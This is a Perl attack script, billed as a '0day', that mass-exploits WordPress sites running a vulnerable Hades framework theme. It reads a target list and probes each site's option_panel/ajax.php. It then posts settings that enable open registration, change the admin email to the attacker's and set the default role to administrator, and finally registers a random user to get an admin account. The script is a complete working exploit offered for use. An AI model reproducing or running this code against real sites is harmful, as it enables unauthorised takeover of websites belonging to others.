#!/usr/bin/perl -w
# Coded By Fallag XTN & WhoAmi
# Greet's : [ CLAY TeaM ~~ Fr3nds TeaM ~~ All My Friends ]
use strict;
use HTTP::Request;
use LWP::UserAgent;
use Term::ANSIColor;
use URI::Split qw/ uri_split uri_join /;
system("title [+] 0Day Wordpress Admin Add v1.0 [+] ");
my $datestring = localtime();
my ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
flag();

my $useragent = randomagent();#Get a Random User Agent 
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });#Https websites accept
$ua->cookie_jar({});# Cookies
$ua->timeout(10);#Time out = 10 you can change it 
$ua->agent($useragent);#agent type

print "\n[+] Enter List Of Target : ";
chomp (my $list=<>);
print "[+] Enter E-mail : ";
chomp (my $mail=<>);
print "[+] Started : $datestring\n";
open(my $arq,'<'.$list) || die($!);
my @site = <$arq>;
@site = grep { !/^$/ } @site;
close($arq);
print "[".($#site+1)."] URL to test \n\n"; 
my $i;
foreach my $web(@site){$i++;
    chomp($web);
    if($web !~ /^(http|https):\/\//){
        $web = 'http://'.$web;
    }
    print "[$i] $web \n";
    Work($web);#exploiting website :)
}

sub Work {
    print "[Testing] $_[0] \n\n";
    my $theme = get_theme($_[0]);
    print "[Yes] Theme Obtained\n";
    my $x= $_[0]."/wp-content/themes/".$theme."/hades_framework/option_panel/ajax.php";
    my $r = $ua->get($x);
    my $xheader = $r->headers()->as_string;
    #print $xheader;
    my $html = $r->content;
    #print "\n\n$html";
    my $e = length($html);
    if ($e eq 0) {
        print "[Yes] Target Infected\n";
        Exp($x);
    }
    elsif ($e eq 0){
        print "[!] Forbiden 404\n\n"

    }
    else {
        print "[!] Target Not Infected\n\n"
    }

}
sub get_theme {
        my $request = HTTP::Request->new(GET=>$_[0]);
        my $response = $ua->request($request);
        if ($response->content=~/wp-content\/themes\/(.*?)\//g){
        $1;
        }
}
sub clean {
my $scheme_host = do {
  my (@parts) = uri_split $_[0];
  uri_join @parts[0,1];
};
}

sub Exp {
    my $search = $ua->post ($_[0],
    Content => ["values[0][name]" =>"users_can_register","values[0][value]" =>"1",
    "values[1][name]" =>"admin_email",
    "values[1][value]" => $mail,
    "values[2][name]" =>"default_role",
    "values[2][value]" =>"administrator",
    "action" => "save",
    "submit" => "submit",]);
    #print $search->content;
    if ($search->content=~/success/) {
        print "[OK]  Payload successfully executed\n";
        my $web=clean($_[0]);
        Exploiting($web);
    }
    else {print "[No]  Faild To Execute Payload \n\n";}
}
# Exploiting -> Creating New Admin Account
sub Exploiting {
    my $user = Generate_user();
    my $y = $_[0]."/wp-login.php?action=register";
    my $regex = '<p class="submit"><input type="submit" name="wp-submit" id="wp-submit" class="button button-primary button-large" value="(.*?)" /></p>';
    my $xx = $ua->get ($y);
    if ($xx->content=~/$regex/){
        if (defined $1){
            my $reg_value = $1;
            my $post = $ua->post($y,
            {
            "user_login" => $user,
            "user_email" => $mail,
            "redirect_to" => "",
            "wp-submit" => $reg_value,
            });
            if (length($post->content) eq 0 || $post->code eq 302) {
                print "[d0ne] Account Successfully Created \n";
                print "[!] User : $user \n";
                print "[!] Password : Check your e-mail \n\n";
            }
            else {print "[No] Error Creating Account \n\n";}
        }
        else {
            print "[No] Can't get register value try to make it manually\n";
            print "[.] To registre :\n";
            print " -> $y\n\n";
        }
    }
}
# Generate random user :)
sub Generate_user {
my $rndstr = rndstr(6, 1..9, 'A'..'Z');
sub rndstr{ join'', @_[ map{ rand @_ } 1 .. shift ] }
}
# Flag
if($^O =~ /Win/){
 
   system("cls");
   system("color a");
   system("title 0Day Wordpress Admin ADD ");
 
}else{
 
   system("clear");
}
sub flag {
     q{
 _____     _               _    _ ______                  
|  _  |   | |             | |  | || ___ \                 
| |/' | __| | __ _ _   _  | |  | || |_/ / __ ___  ___ ___ 
|  /| |/ _` |/ _` | | | | | |/\| ||  __/ '__/ _ \/ __/ __|
\ |_/ / (_| | (_| | |_| | \  /\  /| |  | | |  __/\__ \__ \
 \___/ \__,_|\__,_|\__, |  \/  \(_)_|  |_|  \___||___/___/
                    __/ |                  Add Admin v1.0                             
                   |___/                                 
                   0day - v1 & cod3d by WhoAmi & Fallag XTN
                           GreeTz To : All My Friends
                           #CLAY TeaM
                           #Fr3nds TeaM
                    
    };
}
